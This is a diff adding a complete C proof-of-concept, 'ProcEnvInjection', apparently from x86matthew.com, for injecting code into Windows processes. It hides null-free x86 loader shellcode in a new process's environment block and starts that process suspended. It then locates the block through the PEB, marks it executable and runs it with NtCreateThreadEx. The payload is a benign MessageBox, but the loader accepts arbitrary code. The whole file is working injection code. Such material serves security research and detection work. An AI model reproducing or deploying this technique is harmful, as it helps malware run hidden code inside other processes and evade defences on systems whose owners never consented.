@@ -1,0 +1,552 @@
+#include <stdio.h>
+#include <windows.h>
+
+#define LOADER_CODE_OFFSET 8
+
+struct PROCESS_BASIC_INFORMATION
+{
+	DWORD ExitStatus;
+	BYTE *PebBaseAddress;
+	DWORD *AffinityMask;
+	DWORD BasePriority;
+	DWORD *UniqueProcessId;
+	DWORD *InheritedFromUniqueProcessId;
+};
+
+#define ProcessBasicInformation 0
+
+DWORD (WINAPI *NtQueryInformationProcess)(HANDLE hProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, DWORD ProcessInformationLength, DWORD *ReturnLength);
+DWORD (WINAPI *NtCreateThreadEx)(HANDLE *phThreadHandle, DWORD DesiredAccess, PVOID ObjectAttributes, HANDLE hProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, DWORD *pZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
+
+BYTE bGlobal_LoaderCode[] =
+{
+	// prefix
+	'A', 0x00, 'A', 0x00, 'A', 0x00, '=', 0x00,
+
+	// push edi
+	0x57,
+	// push esi
+	0x56,
+
+	// push 0x40 (PAGE_EXECUTE_READWRITE)
+	0x6A, 0x40,
+	// mov eax, 0xXXXXXXXX
+	0xB8, 0x44, 0x33, 0x22, 0x11,
+	// xor eax, 0xXXXXXXXX
+	0x35, 0x44, 0x33, 0x22, 0x11,
+	// push eax (MEM_COMMIT | MEM_RESERVE)
+	0x50,
+	// mov eax, 0xXXXXXXXX
+	0xB8, 0x44, 0x33, 0x22, 0x11,
+	// xor eax, 0xXXXXXXXX
+	0x35, 0x44, 0x33, 0x22, 0x11,
+	// push eax (Size)
+	0x50,
+	// xor eax, eax
+	0x33, 0xC0,
+	// push eax (BaseAddr)
+	0x50,
+	// mov eax, 0xXXXXXXXX
+	0xB8, 0x44, 0x33, 0x22, 0x11,
+	// xor eax, 0xXXXXXXXX
+	0x35, 0x44, 0x33, 0x22, 0x11,
+	// call eax (VirtualAlloc)
+	0xFF, 0xD0,
+
+	// mov edi, eax (DataAddr)
+	0x8B, 0xF8,
+
+	// mov eax, 0xXXXXXXXX
+	0xB8, 0x44, 0x33, 0x22, 0x11,
+	// xor eax, 0xXXXXXXXX
+	0x35, 0x44, 0x33, 0x22, 0x11,
+	// push eax (ProcessID)
+	0x50,
+	// xor eax, eax
+	0x33, 0xC0,
+	// push eax (bInheritHandle)
+	0x50,
+	// push 0x10 (PROCESS_VM_READ)
+	0x6A, 0x10,
+	// mov eax, 0xXXXXXXXX
+	0xB8, 0x44, 0x33, 0x22, 0x11,
+	// xor eax, 0xXXXXXXXX
+	0x35, 0x44, 0x33, 0x22, 0x11,
+	// call eax (OpenProcess)
+	0xFF, 0xD0,
+
+	// mov esi, eax (ProcessHandle)
+	0x8B, 0xF0,
+
+	// xor eax, eax
+	0x33, 0xC0,
+	// push eax (NumberOfBytesRead)
+	0x50,
+	// mov eax, 0xXXXXXXXX
+	0xB8, 0x44, 0x33, 0x22, 0x11,
+	// xor eax, 0xXXXXXXXX
+	0x35, 0x44, 0x33, 0x22, 0x11,
+	// push eax (BytesToRead)
+	0x50,
+	// push edi (ReadBuffer)
+	0x57,
+	// mov eax, 0xXXXXXXXX
+	0xB8, 0x44, 0x33, 0x22, 0x11,
+	// xor eax, 0xXXXXXXXX
+	0x35, 0x44, 0x33, 0x22, 0x11,
+	// push eax (BaseAddr)
+	0x50,
+	// push esi (ProcessHandle)
+	0x56,
+	// mov eax, 0xXXXXXXXX
+	0xB8, 0x44, 0x33, 0x22, 0x11,
+	// xor eax, 0xXXXXXXXX
+	0x35, 0x44, 0x33, 0x22, 0x11,
+	// call eax (ReadProcessMemory)
+	0xFF, 0xD0,
+
+	// push esi (ProcessHandle)
+	0x56,
+	// mov eax, 0xXXXXXXXX
+	0xB8, 0x44, 0x33, 0x22, 0x11,
+	// xor eax, 0xXXXXXXXX
+	0x35, 0x44, 0x33, 0x22, 0x11,
+	// call eax (CloseHandle)
+	0xFF, 0xD0,
+
+	// pushad
+	0x60,
+	// call edi (DataAddr)
+	0xFF, 0xD7,
+	// popad
+	0x61,
+
+	// mov eax, 0xXXXXXXXX
+	0xB8, 0x44, 0x33, 0x22, 0x11,
+	// xor eax, 0xXXXXXXXX
+	0x35, 0x44, 0x33, 0x22, 0x11,
+	// push eax (MEM_RELEASE)
+	0x50,
+	// xor eax, eax
+	0x33, 0xC0,
+	// push eax (Size)
+	0x50,
+	// push edi (DataAddr)
+	0x57,
+	// mov eax, 0xXXXXXXXX
+	0xB8, 0x44, 0x33, 0x22, 0x11,
+	// xor eax, 0xXXXXXXXX
+	0x35, 0x44, 0x33, 0x22, 0x11,
+	// call eax (VirtualFree)
+	0xFF, 0xD0,
+
+	// pop esi
+	0x5E,
+	// pop edi
+	0x5F,
+
+	// return from thread cleanly - can't use "retn 4"
+	// pop eax
+	0x58,
+	// pop ecx
+	0x59,
+	// push eax
+	0x50,
+	// ret
+	0xC3,
+
+	// (end of string - 2 widechar null characters)
+	0x00, 0x00, 0x00, 0x00
+};
+
+DWORD EncodeDwordValue(DWORD dwValue, DWORD *pdwXorValue, DWORD *pdwEncodedValue)
+{
+	BYTE bOrigValue[4];
+	BYTE bXorValue[4];
+	BYTE bEncodedValue[4];
+
+	// copy original value
+	memcpy((void*)bOrigValue, (void*)&dwValue, sizeof(DWORD));
+
+	// encode value
+	for(DWORD i = 0; i < sizeof(DWORD); i++)
+	{
+		bXorValue[i] = 0x01;
+		for(;;)
+		{
+			// ensure the value contains no 0x00 bytes
+			bEncodedValue[i] = bOrigValue[i] ^ bXorValue[i];
+			if(bEncodedValue[i] == 0 || bXorValue[i] == 0)
+			{
+				bXorValue[i]++;
+				continue;
+			}
+
+			break;
+		}
+	}
+
+	// store values
+	*pdwXorValue = *(DWORD*)bXorValue;
+	*pdwEncodedValue = *(DWORD*)bEncodedValue;
+
+	return 0;
+}
+
+DWORD StartInjectedProcess(char *pExePath, BYTE *pPayload, DWORD dwPayloadSize)
+{
+	STARTUPINFO StartupInfo;
+	PROCESS_INFORMATION ProcessInfo;
+	BYTE bLoaderCode_Copy[sizeof(bGlobal_LoaderCode)];
+	PROCESS_BASIC_INFORMATION ProcessBasicInfoData;
+	BYTE *pRemotePtr_RtlUserProcessParameters = NULL;
+	BYTE *pRemotePtr_EnvironmentStr = NULL;
+	DWORD dwOriginalProtect = 0;
+	HANDLE hThread = NULL;
+	DWORD dwTempProtect = 0;
+	wchar_t *pOrigEnvBlock = NULL;
+	DWORD dwOrigEnvBlockTotalLengthBytes = 0;
+	DWORD dwCurrEnvEntryLength = 0;
+	wchar_t *pCurrEnvEntry = NULL;
+	BYTE *pNewEnvBlock = NULL;
+
+	// ensure the loader code is 16-bit aligned
+	if((sizeof(bGlobal_LoaderCode) % 2) != 0)
+	{
+		printf("Error: Loader code is out of alignment\n");
+		// loader code is out of alignment - add an extra 0x00 character to the end of the data
+		return 1;
+	}
+
+	printf("Generating loader code...\n");
+
+	// encode values in the loader code to ensure no 0x00 characters exist
+	EncodeDwordValue(MEM_COMMIT | MEM_RESERVE, (DWORD*)&bGlobal_LoaderCode[13], (DWORD*)&bGlobal_LoaderCode[18]);
+	EncodeDwordValue(dwPayloadSize, (DWORD*)&bGlobal_LoaderCode[24], (DWORD*)&bGlobal_LoaderCode[29]);
+	EncodeDwordValue((DWORD)VirtualAlloc, (DWORD*)&bGlobal_LoaderCode[38], (DWORD*)&bGlobal_LoaderCode[43]);
+	EncodeDwordValue(GetCurrentProcessId(), (DWORD*)&bGlobal_LoaderCode[52], (DWORD*)&bGlobal_LoaderCode[57]);
+	EncodeDwordValue((DWORD)OpenProcess, (DWORD*)&bGlobal_LoaderCode[68], (DWORD*)&bGlobal_LoaderCode[73]);
+	EncodeDwordValue(dwPayloadSize, (DWORD*)&bGlobal_LoaderCode[85], (DWORD*)&bGlobal_LoaderCode[90]);
+	EncodeDwordValue((DWORD)pPayload, (DWORD*)&bGlobal_LoaderCode[97], (DWORD*)&bGlobal_LoaderCode[102]);
+	EncodeDwordValue((DWORD)ReadProcessMemory, (DWORD*)&bGlobal_LoaderCode[109], (DWORD*)&bGlobal_LoaderCode[114]);
+	EncodeDwordValue((DWORD)CloseHandle, (DWORD*)&bGlobal_LoaderCode[122], (DWORD*)&bGlobal_LoaderCode[127]);
+	EncodeDwordValue(MEM_RELEASE, (DWORD*)&bGlobal_LoaderCode[138], (DWORD*)&bGlobal_LoaderCode[143]);
+	EncodeDwordValue((DWORD)VirtualFree, (DWORD*)&bGlobal_LoaderCode[153], (DWORD*)&bGlobal_LoaderCode[158]);
+
+	printf("Appending code to existing environment string...\n");
+
+	// get existing environment block
+	pOrigEnvBlock = GetEnvironmentStringsW();
+	if(pOrigEnvBlock == NULL)
+	{
+		printf("Error: Failed to read environment strings\n");
+		return 1;
+	}
+
+	// calculate length of existing environment block
+	for(;;)
+	{
+		// get current environment string entry
+		pCurrEnvEntry = (wchar_t*)((BYTE*)pOrigEnvBlock + dwOrigEnvBlockTotalLengthBytes);
+
+		// calculate length
+		dwCurrEnvEntryLength = wcslen(pCurrEnvEntry);
+		if(dwCurrEnvEntryLength == 0)
+		{
+			break;
+		}
+
+		// increase total size counter
+		dwOrigEnvBlockTotalLengthBytes += ((dwCurrEnvEntryLength + 1) * sizeof(wchar_t));
+	}
+
+	// allocate a new environment string buffer
+	pNewEnvBlock = (BYTE*)VirtualAlloc(NULL, dwOrigEnvBlockTotalLengthBytes + sizeof(bGlobal_LoaderCode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if(pNewEnvBlock == NULL)
+	{
+		printf("Error: Failed to allocate local memory\n");
+
+		// error
+		FreeEnvironmentStringsW(pOrigEnvBlock);
+
+		return 1;
+	}
+
+	// copy the original values and append the loader code
+	memcpy((void*)pNewEnvBlock, pOrigEnvBlock, dwOrigEnvBlockTotalLengthBytes);
+	memcpy((void*)(pNewEnvBlock + dwOrigEnvBlockTotalLengthBytes), bGlobal_LoaderCode, sizeof(bGlobal_LoaderCode));
+
+	// free temporary environment string buffer
+	FreeEnvironmentStringsW(pOrigEnvBlock);
+
+	printf("Creating target process: '%s'...\n", pExePath);
+
+	// launch target process with the injection code in the environment strings	
+	memset(&StartupInfo, 0, sizeof(StartupInfo));
+	StartupInfo.cb = sizeof(StartupInfo);
+	if(CreateProcess(NULL, pExePath, NULL, NULL, 0, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT | CREATE_SUSPENDED, (wchar_t*)pNewEnvBlock, NULL, &StartupInfo, &ProcessInfo) == 0)
+	{
+		printf("Error: Failed to launch target process\n");
+
+		// error
+		VirtualFree(pNewEnvBlock, 0, MEM_RELEASE);
+
+		return 1;
+	}
+
+	// free environment block buffer
+	VirtualFree(pNewEnvBlock, 0, MEM_RELEASE);
+
+	printf("Locating target code in remote process...\n");
+
+	// get process info
+	memset((void*)&ProcessBasicInfoData, 0, sizeof(ProcessBasicInfoData));
+	if(NtQueryInformationProcess(ProcessInfo.hProcess, ProcessBasicInformation, &ProcessBasicInfoData, sizeof(ProcessBasicInfoData), NULL) != 0)
+	{
+		printf("Error: Failed to retrieve process info\n");
+
+		// error
+		TerminateProcess(ProcessInfo.hProcess, 0);
+		CloseHandle(ProcessInfo.hThread);
+		CloseHandle(ProcessInfo.hProcess);
+
+		return 1;
+	}
+
+	// create a thread that calls Sleep(0) to initialise the environment strings in the PEB
+	if(NtCreateThreadEx(&hThread, 0x001FFFFF, NULL, ProcessInfo.hProcess, Sleep, (LPVOID)0, 0, NULL, 0, 0, NULL) != 0)
+	{
+		printf("Error: Failed to create Sleep thread in remote process\n");
+
+		// error
+		TerminateProcess(ProcessInfo.hProcess, 0);
+		CloseHandle(ProcessInfo.hThread);
+		CloseHandle(ProcessInfo.hProcess);
+
+		return 1;
+	}
+	WaitForSingleObject(hThread, INFINITE);
+	CloseHandle(hThread);
+
+	// read RtlUserProcessParameters ptr from PEB
+	if(ReadProcessMemory(ProcessInfo.hProcess, (void*)(ProcessBasicInfoData.PebBaseAddress + 0x10), (void*)&pRemotePtr_RtlUserProcessParameters, sizeof(BYTE*), NULL) == 0)
+	{
+		printf("Error: Failed to read RtlUserProcessParameters value from PEB\n");
+
+		// error
+		TerminateProcess(ProcessInfo.hProcess, 0);
+		CloseHandle(ProcessInfo.hThread);
+		CloseHandle(ProcessInfo.hProcess);
+
+		return 1;
+	}
+
+	// read EnvironmentStr ptr from RtlUserProcessParameters
+	if(ReadProcessMemory(ProcessInfo.hProcess, (void*)(pRemotePtr_RtlUserProcessParameters + 0x48), (void*)&pRemotePtr_EnvironmentStr, sizeof(BYTE*), NULL) == 0)
+	{
+		printf("Error: Failed to read EnvironmentStr value from RtlUserProcessParameters\n");
+
+		// error
+		TerminateProcess(ProcessInfo.hProcess, 0);
+		CloseHandle(ProcessInfo.hThread);
+		CloseHandle(ProcessInfo.hProcess);
+
+		return 1;
+	}
+
+	// update environment string ptr to ignore the original bytes
+	pRemotePtr_EnvironmentStr += dwOrigEnvBlockTotalLengthBytes;
+
+	// read EnvironmentStr value
+	memset(bLoaderCode_Copy, 0, sizeof(bLoaderCode_Copy));
+	if(ReadProcessMemory(ProcessInfo.hProcess, (void*)pRemotePtr_EnvironmentStr, (void*)bLoaderCode_Copy, sizeof(bGlobal_LoaderCode), NULL) == 0)
+	{
+		printf("Error: Failed to read loader data from EnvironmentStr\n");
+
+		// error
+		TerminateProcess(ProcessInfo.hProcess, 0);
+		CloseHandle(ProcessInfo.hThread);
+		CloseHandle(ProcessInfo.hProcess);
+
+		return 1;
+	}
+
+	// ensure the loader code has been copied correctly
+	if(memcmp(bLoaderCode_Copy, bGlobal_LoaderCode, sizeof(bGlobal_LoaderCode)) != 0)
+	{
+		printf("Error: Invalid loader data\n");
+
+		// error
+		TerminateProcess(ProcessInfo.hProcess, 0);
+		CloseHandle(ProcessInfo.hThread);
+		CloseHandle(ProcessInfo.hProcess);
+
+		return 1;
+	}
+
+	printf("Executing code in remote process...\n");
+
+	// temporarily make the loader code executable
+	if(VirtualProtectEx(ProcessInfo.hProcess, pRemotePtr_EnvironmentStr, sizeof(bGlobal_LoaderCode), PAGE_EXECUTE_READWRITE, &dwOriginalProtect) == 0)
+	{
+		printf("Error: Failed to update memory protection\n");
+
+		// error
+		TerminateProcess(ProcessInfo.hProcess, 0);
+		CloseHandle(ProcessInfo.hThread);
+		CloseHandle(ProcessInfo.hProcess);
+
+		return 1;
+	}
+
+	// execute payload
+	if(NtCreateThreadEx(&hThread, 0x001FFFFF, NULL, ProcessInfo.hProcess, (BYTE*)(pRemotePtr_EnvironmentStr + LOADER_CODE_OFFSET), (LPVOID)0, 0, NULL, 0, 0, NULL) != 0)
+	{
+		printf("Error: Failed to create code loader thread in remote process\n");
+
+		// error
+		TerminateProcess(ProcessInfo.hProcess, 0);
+		CloseHandle(ProcessInfo.hThread);
+		CloseHandle(ProcessInfo.hProcess);
+
+		return 1;
+	}
+	WaitForSingleObject(hThread, INFINITE);
+	CloseHandle(hThread);
+
+	// restore original protection value
+	if(VirtualProtectEx(ProcessInfo.hProcess, pRemotePtr_EnvironmentStr, sizeof(bGlobal_LoaderCode), dwOriginalProtect, &dwTempProtect) == 0)
+	{
+		printf("Error: Failed to update memory protection\n");
+
+		// error
+		TerminateProcess(ProcessInfo.hProcess, 0);
+		CloseHandle(ProcessInfo.hThread);
+		CloseHandle(ProcessInfo.hProcess);
+
+		return 1;
+	}
+
+	// resume main thread
+	ResumeThread(ProcessInfo.hThread);
+
+	// close handles
+	CloseHandle(ProcessInfo.hThread);
+	CloseHandle(ProcessInfo.hProcess);
+
+	return 0;
+}
+
+int main(int argc, char *argv[])
+{
+	char *pExePath = NULL;
+
+	BYTE bPayload[] =
+	{
+		// string: <user32.dll>
+		// push 0x00006C6C
+		0x68, 0x6C, 0x6C, 0x00, 0x00,
+		// push 0x642E3233
+		0x68, 0x33, 0x32, 0x2E, 0x64,
+		// push 0x72657375
+		0x68, 0x75, 0x73, 0x65, 0x72,
+		// mov ecx, esp
+		0x8B, 0xCC,
+		// push ecx (ModuleName)
+		0x51,
+		// mov eax, LoadLibraryA
+		0xB8, 0x44, 0x33, 0x22, 0x11,
+		// call eax
+		0xFF, 0xD0,
+
+		 // string: <Code injected successfully!>
+		// push 0x0021796C
+		0x68, 0x6C, 0x79, 0x21, 0x00,
+		// push 0x6C756673
+		0x68, 0x73, 0x66, 0x75, 0x6C,
+		// push 0x73656363
+		0x68, 0x63, 0x63, 0x65, 0x73,
+		// push 0x75732064
+		0x68, 0x64, 0x20, 0x73, 0x75,
+		// push 0x65746365
+		0x68, 0x65, 0x63, 0x74, 0x65,
+		// push 0x6A6E6920
+		0x68, 0x20, 0x69, 0x6E, 0x6A,
+		// push 0x65646F43
+		0x68, 0x43, 0x6F, 0x64, 0x65,
+		// mov ecx, esp
+		0x8B, 0xCC,
+		// string: <www.x86matthew.com>
+		// push 0x00006D6F
+		0x68, 0x6F, 0x6D, 0x00, 0x00,
+		// push 0x632E7765
+		0x68, 0x65, 0x77, 0x2E, 0x63,
+		// push 0x68747461
+		0x68, 0x61, 0x74, 0x74, 0x68,
+		// push 0x6D363878
+		0x68, 0x78, 0x38, 0x36, 0x6D,
+		// push 0x2E777777
+		0x68, 0x77, 0x77, 0x77, 0x2E,
+		// mov ebx, esp
+		0x8B, 0xDC,
+		// push MB_OK
+		0x6A, 0x00,
+		// push ebx (Caption)
+		0x53,
+		// push ecx (Text)
+		0x51,
+		// push hWnd
+		0x6A, 0x00,
+		// mov eax, MessageBoxA
+		0xB8, 0x44, 0x33, 0x22, 0x11,
+		// call eax
+		0xFF, 0xD0,
+
+		// add esp, 0x3C
+		0x83, 0xC4, 0x3C,
+
+		// ret
+		0xC3
+	};
+
+	// set function addresses
+	*(DWORD*)&bPayload[19] = (DWORD)LoadLibraryA;
+	*(DWORD*)&bPayload[96] = (DWORD)MessageBoxA;
+
+	printf("ProcEnvInjection - www.x86matthew.com\n\n");
+
+	// check params
+	if(argc != 2)
+	{
+		printf("Usage: %s [exe_path]\n\n", argv[0]);
+
+		return 1;
+	}
+
+	// get cmd param
+	pExePath = argv[1];
+	
+	// get NtQueryInformationProcess function
+	NtQueryInformationProcess = (unsigned long (__stdcall *)(void *,unsigned long,void *,unsigned long,unsigned long *))GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationProcess");
+	if(NtQueryInformationProcess == NULL)
+	{
+		return 1;
+	}
+
+	// get NtCreateThreadEx function
+	NtCreateThreadEx = (unsigned long (__stdcall *)(void ** ,unsigned long,void *,void *,void *,void *,unsigned long,unsigned long *,unsigned long,unsigned long,void *))GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
+	if(NtCreateThreadEx == NULL)
+	{
+		return 1;
+	}
+
+	// start target process
+	if(StartInjectedProcess(pExePath, bPayload, sizeof(bPayload)) != 0)
+	{
+		return 1;
+	}
+
+	printf("Injected successfully\n");
+
+	return 0;
+}
